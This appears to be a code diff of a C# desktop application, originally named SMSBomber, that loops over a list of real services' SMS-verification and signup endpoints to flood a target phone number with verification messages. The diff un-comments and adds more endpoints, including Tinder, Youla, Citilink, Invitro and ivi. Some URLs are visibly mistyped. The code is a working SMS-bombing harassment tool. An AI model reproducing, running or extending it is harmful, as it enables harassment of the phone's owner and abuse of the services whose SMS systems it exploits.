@@ -15,9 +15,7 @@ using System.Windows.Shapes;
 using System.IO;
 using System.Net;
 
-
-
-namespace SMSBomber
+namespace smsboot
 {
     /// <summary>
     /// Логика взаимодействия для MainWindow.xaml
@@ -34,12 +32,6 @@ namespace SMSBomber
             }
             tbNumber.MaxLength = 10;
         }
-
-        private void cblterations_SelectionChanged(object sender, SelectionChangedEventArgs e)
-        {
-
-        }
-
         private void tbNumber_PreviewTextInput(object sender, TextCompositionEventArgs e)
         {
             e.Handled = "0123456789".IndexOf(e.Text) < 0;
@@ -82,6 +74,7 @@ namespace SMSBomber
             {
                 tbLog.AppendText($"He-a, {name} не смог\n");
             }
+
         }
 
         private void Button_Click(object sender, RoutedEventArgs e)
@@ -89,27 +82,26 @@ namespace SMSBomber
             string number = tbNumber.Text;
             for (int i = 0; i < int.Parse(cblterations.Text); i++)
             {
-               //Send("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", $"phone_number =+7{number}","Tinder");
-               //Send("https://app.karusel.ru/api/v1/phone/", $"phone_number=+7{number}", "tinder");
-               //Send("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", $"phone_number=+7{number}", "tinder");
-                Send("https://api-prime.anytime.global/api/v2/auth/sendverificationcode", $"phone_number=+7{number}", "tinder");
-                Send("https://youla.ru/web-api/auth/request_code", $"phone_number +7{number}", "tinder");
-                Send("https://www.citilink.ru/registration/confirm/phone/+", $"phone_number=+7{number}", "tinder");
-                Send("https://api.sunlight.net/v3/customers/authorization/", $"phone_number=+7{number}", "tinder");
-                Send("https://lk.invitro.ru/sp/mobileapi/createuserbypassword", $"phone_number=+7{number}", "tinder");
-                Send("https://api.delitime.ru/api/v2/signup", $"phone_number=+7{number}", "tinder");
-                Send("https://api.mtstv.ru/v1/users", $"phone_number +7{number}", "tinder");
-                Send("https://moscow.rutaxi.ru/ajax_keycode.html", $"phone_number=+7{number}", "tinder");
-                Send("https://www.icq.com/smsreg/requestphonevalidation.php", $"phone_number=+7{number}", "tinder");
-                Send("https://terra-1.indriverapp.com/api/authorization?locale=ru", $"phone_number=+7{number}", "tinder");
-                Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone_number=+7{number}", "tinder");
-
-                Send("https://api_gotinder.com/v2/auth/sms/send?auth typessms&locale=ru", $"phone_number=+7{number}", "Tinder");
+                Send("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", $"phone_number =+7{number}","Tinder");
+                Send("https://app.karusel.ru/api/v1/phone/", $"phone_number=+7{number}", "karusel");
+                Send("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", $"phone_number=+7{number}", "qlean");
+                Send("https://api-prime.anytime.global/api/v2/auth/sendverificationcode", $"phone_number=+7{number}", "api-prime");
+                Send("https://youla.ru/web-api/auth/request_code", $"phone_number +7{number}", "youla");
+                Send("https://www.citilink.ru/registration/confirm/phone/+", $"phone_number=+7{number}", "citilink");
+                Send("https://api.sunlight.net/v3/customers/authorization/", $"phone_number=+7{number}", "sunlight");
+                Send("https://lk.invitro.ru/sp/mobileapi/createuserbypassword", $"phone_number=+7{number}", "invitro");
+                Send("https://api.delitime.ru/api/v2/signup", $"phone_number=+7{number}", "delitime");
+                Send("https://api.mtstv.ru/v1/users", $"phone_number +7{number}", "mtstv");
+                Send("https://moscow.rutaxi.ru/ajax_keycode.html", $"phone_number=+7{number}", "rutaxi");
+                Send("https://www.icq.com/smsreg/requestphonevalidation.php", $"phone_number=+7{number}", "icq");
+                Send("https://terra-1.indriverapp.com/api/authorization?locale=ru", $"phone_number=+7{number}", "terra-1");
+                Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone_number=+7{number}", "ivi");
+                Send("https://api_gotinder.com/v2/auth/sms/send?auth typessms&locale=ru", $"phone_number=+7{number}", "gitinder");
                 Send("https://app.karusel.ru/api/v1/phone", $"phone=8{number}", "Карусель");
                 Send("https://glean.ru/clients-api/v2/smscodes/auth/request_code", $"phone=7{number}", "Qlean");
                 Send("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", $"phone=7 {number}", "AT PRIME");
                 Send("https://youla.ru/web-api/auth/request_code", $"phone=+7{number}", "Юла");
-                Send($"https://unw.citilink.ru/registration/confirm/phone/+ 7{number}/",$"", "CityLink");
+                Send($"https://unw.citilink.ru/registration/confirm/phone/+ 7{number}/", $"", "CityLink");
                 Send("https://api.sunlight.net/v3/customers/authorization/", $"phone=7{number}", "SunLight");
                 Send("https://1k.invitro.ru/sp/mobileApi/createUserByPassword", $"password=ctclutctc&application=1kp&login= +7{number}", "Invitro");
                 Send("https://api.delitime.ru/api/v2/signup", $"SignupForm[username]=7{number}&SignupForm[device_type]=3", "DeliMobil");
@@ -122,7 +114,6 @@ namespace SMSBomber
                 Send("https://api.ivi.ru/mobileapi/user/register/phone/v6", $"phone=7{number}", "IVI");
             }
         }
-
-      
     }
-}
+ }
+
